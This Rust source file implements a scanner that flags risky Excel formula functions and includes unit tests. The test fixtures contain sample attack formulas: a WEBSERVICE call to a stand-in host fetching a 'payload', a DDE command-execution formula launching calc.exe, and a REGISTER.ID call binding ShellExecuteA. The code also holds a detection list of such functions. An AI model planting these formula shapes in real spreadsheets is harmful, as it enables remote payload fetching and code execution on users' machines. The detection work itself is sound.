//! Excel suspicious-formula flag (TASK-274).
//!
//! Daemon-side code teases cell formulas out of `.xlsx`
//! (`sheet1.xml` `<f>…</f>` elements) and `.xls`
//! (BIFF `FORMULA` records) and hands them to [`scan_formulas`].
//! This function flags six high-risk functions:
//!
//!   * `WEBSERVICE` — network call from a cell
//!   * `IMPORTDATA` — Google-Sheets-port that lands in some `.xlsx`
//!     re-saved through Sheets
//!   * `DDE` and `=cmd|'/c …'!A0` style DDE invocations
//!   * `RTD` (Real-Time Data) — accepts `progid, server, topics`
//!   * `CALL` — invokes arbitrary DLL exports
//!   * `REGISTER.ID` — Excel 4.0 macro DLL registration
//!   * `EXEC` — XLM macro process launcher
//!
//! Each finding carries the sheet name + cell reference so the
//! UI can deep-link.

use serde::{Deserialize, Serialize};

/// One cell formula extracted from a workbook. `formula` is the
/// raw text (without the leading `=`); `sheet` and `cell_ref`
/// (`A1` / `R1C1`) come from the workbook XML.
#[derive(Debug, Clone)]
pub struct CellFormula<'a> {
    pub sheet: &'a str,
    pub cell_ref: &'a str,
    pub formula: &'a str,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum XlSuspiciousFn {
    WebService,
    ImportData,
    Dde,
    Rtd,
    Call,
    Register,
    Exec,
}

impl XlSuspiciousFn {
    pub fn label(self) -> &'static str {
        match self {
            XlSuspiciousFn::WebService => "WEBSERVICE",
            XlSuspiciousFn::ImportData => "IMPORTDATA",
            XlSuspiciousFn::Dde => "DDE",
            XlSuspiciousFn::Rtd => "RTD",
            XlSuspiciousFn::Call => "CALL",
            XlSuspiciousFn::Register => "REGISTER.ID",
            XlSuspiciousFn::Exec => "EXEC",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct XlFormulaFinding {
    pub sheet: String,
    pub cell_ref: String,
    pub function: XlSuspiciousFn,
    /// Truncated copy of the formula text for UI display
    /// (200-char cap).
    pub snippet: String,
}

const SUSPICIOUS: &[(&str, XlSuspiciousFn)] = &[
    ("webservice(", XlSuspiciousFn::WebService),
    ("importdata(", XlSuspiciousFn::ImportData),
    ("rtd(", XlSuspiciousFn::Rtd),
    ("call(", XlSuspiciousFn::Call),
    ("register.id(", XlSuspiciousFn::Register),
    ("exec(", XlSuspiciousFn::Exec),
];

pub fn scan_formulas(formulas: &[CellFormula<'_>]) -> Vec<XlFormulaFinding> {
    let mut out = Vec::new();
    for f in formulas {
        let lc = f.formula.to_ascii_lowercase();
        let mut seen: Vec<XlSuspiciousFn> = Vec::new();
        for (needle, kind) in SUSPICIOUS {
            if lc.contains(needle) && !seen.contains(kind) {
                out.push(XlFormulaFinding {
                    sheet: f.sheet.to_string(),
                    cell_ref: f.cell_ref.to_string(),
                    function: *kind,
                    snippet: truncate(f.formula, 200),
                });
                seen.push(*kind);
            }
        }
        // DDE has two surface forms: `=cmd|'/c calc.exe'!A0` and
        // an explicit DDE function (`=DDE(server, topic, item)`).
        // The first is a unique-to-Excel attack shape.
        if lc.contains("|'") && lc.contains("'!") && !seen.contains(&XlSuspiciousFn::Dde) {
            out.push(XlFormulaFinding {
                sheet: f.sheet.to_string(),
                cell_ref: f.cell_ref.to_string(),
                function: XlSuspiciousFn::Dde,
                snippet: truncate(f.formula, 200),
            });
        }
    }
    out
}

fn truncate(s: &str, cap: usize) -> String {
    if s.len() <= cap {
        return s.to_string();
    }
    let mut end = cap;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    let mut out = s[..end].to_string();
    out.push('…');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_webservice_call() {
        let f = CellFormula {
            sheet: "Sheet1",
            cell_ref: "B7",
            formula: "WEBSERVICE(\"https://evil.example/payload\")",
        };
        let findings = scan_formulas(&[f]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].function, XlSuspiciousFn::WebService);
        assert_eq!(findings[0].cell_ref, "B7");
    }

    #[test]
    fn flags_dde_classic_form() {
        let f = CellFormula {
            sheet: "Sheet1",
            cell_ref: "A1",
            formula: "cmd|'/c calc.exe'!A0",
        };
        let findings = scan_formulas(&[f]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].function, XlSuspiciousFn::Dde);
    }

    #[test]
    fn flags_register_id_xlm_macro() {
        let f = CellFormula {
            sheet: "Macro1",
            cell_ref: "C3",
            formula: "REGISTER.ID(\"shell32\", \"ShellExecuteA\", \"JJCCJJJ\")",
        };
        let findings = scan_formulas(&[f]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].function, XlSuspiciousFn::Register);
    }

    #[test]
    fn single_formula_can_yield_multiple_findings() {
        let f = CellFormula {
            sheet: "S",
            cell_ref: "Z9",
            formula: "WEBSERVICE(\"x\")&IMPORTDATA(\"y\")",
        };
        let findings = scan_formulas(&[f]);
        assert_eq!(findings.len(), 2);
    }

    #[test]
    fn benign_formulas_yield_nothing() {
        let f = CellFormula {
            sheet: "S",
            cell_ref: "A1",
            formula: "SUM(A2:A10)+VLOOKUP(B1,Sheet2!A:B,2,FALSE)",
        };
        assert!(scan_formulas(&[f]).is_empty());
    }

    #[test]
    fn duplicate_within_formula_only_fires_once() {
        let f = CellFormula {
            sheet: "S",
            cell_ref: "A1",
            formula: "WEBSERVICE(\"a\")+WEBSERVICE(\"b\")",
        };
        let findings = scan_formulas(&[f]);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn case_insensitive_match() {
        let f = CellFormula {
            sheet: "S",
            cell_ref: "A1",
            formula: "rtd(\"comaddin\", , \"topic\")",
        };
        let findings = scan_formulas(&[f]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].function, XlSuspiciousFn::Rtd);
    }

    #[test]
    fn truncates_long_snippet() {
        let long = "x".repeat(400);
        let f = CellFormula {
            sheet: "S",
            cell_ref: "A1",
            formula: &format!("WEBSERVICE({long})"),
        };
        let findings = scan_formulas(&[f]);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].snippet.len() <= 204); // 200 bytes + ellipsis
        assert!(findings[0].snippet.ends_with('…'));
    }
}
